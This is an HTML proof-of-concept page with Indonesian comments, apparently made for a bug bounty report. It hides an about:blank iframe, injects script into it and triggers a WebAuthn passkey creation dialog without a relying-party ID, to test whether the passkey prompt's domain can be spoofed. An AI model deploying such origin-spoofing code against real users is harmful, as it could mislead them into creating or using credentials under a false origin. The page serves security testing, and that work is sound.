<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Passkey - about:blank Origin</title>
</head>
<body>
    <h2>Uji Coba Spoofing Domain (about:blank)</h2>
    <p>Klik tombol di bawah. Script akan membuat iframe <code>about:blank</code>, lalu memicu dialog Passkey dari dalam iframe tersebut.</p>
    
    <button id="triggerBtn" style="padding: 15px; font-size: 16px;">Picu Passkey dari about:blank</button>
    
    <div id="log" style="margin-top: 20px; font-family: monospace; background: #f4f4f4; padding: 10px;"></div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg) { logDiv.innerHTML += "<br>> " + msg; }

        document.getElementById('triggerBtn').addEventListener('click', () => {
            logDiv.innerHTML = "Membuat iframe about:blank...";

            // 1. Buat iframe dengan src about:blank
            // Karena iframe tanpa src (atau about:blank) mewarisi origin dari parent (halaman ini)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none'; // Sembunyikan iframe agar tidak terlihat
            
            // 2. Tambahkan iframe ke DOM (wajib agar script bisa berjalan)
            document.body.appendChild(iframe);

            // 3. Tunggu iframe siap, lalu suntikkan script WebAuthn ke dalamnya
            iframe.onload = () => {
                log("Iframe siap. Menyuntikkan script WebAuthn...");
                
                const iframeDoc = iframe.contentWindow.document;
                const script = iframeDoc.createElement('script');
                
                // Script ini akan dieksekusi DI DALAM konteks iframe (about:blank)
                script.textContent = `
                    async function triggerPasskey() {
                        try {
                            // Perhatikan: Kita tidak mendefinisikan 'rp.id' secara eksplisit.
                            // Browser akan mencoba mengambil origin dari context saat ini (about:blank).
                            const cred = await navigator.credentials.create({
                                publicKey: {
                                    challenge: new Uint8Array([1, 2, 3, 4]),
                                    rp: { name: "PoC Bug Bounty" }, 
                                    user: {
                                        id: new Uint8Array([5, 6, 7, 8]),
                                        name: "test",
                                        displayName: "test"
                                    },
                                    pubKeyCredParams: [{ type: "public-key", alg: -7 }],
                                    authenticatorSelection: { authenticatorAttachment: "platform" }
                                }
                            });
                            // Kirim hasil kembali ke parent
                            window.parent.postMessage("SUKSES", "*");
                        } catch (e) {
                            // Jika error, kirim pesan error ke parent
                            window.parent.postMessage("ERROR: " + e.name + " - " + e.message, "*");
                        }
                    }
                `;
                iframeDoc.head.appendChild(script);
                
                // 4. Panggil fungsi di dalam iframe
                log("Memicu navigator.credentials.create() dari about:blank...");
                iframe.contentWindow.triggerPasskey();
            };

            // 5. Tangkap pesan balik dari iframe
            window.addEventListener('message', (event) => {
                log("Respon dari iframe: " + event.data);
            });
            
            // Ganti src menjadi about:blank setelah disisipkan ke DOM (trik lama)
            iframe.src = "about:blank";
        });
    </script>
</body>
</html>
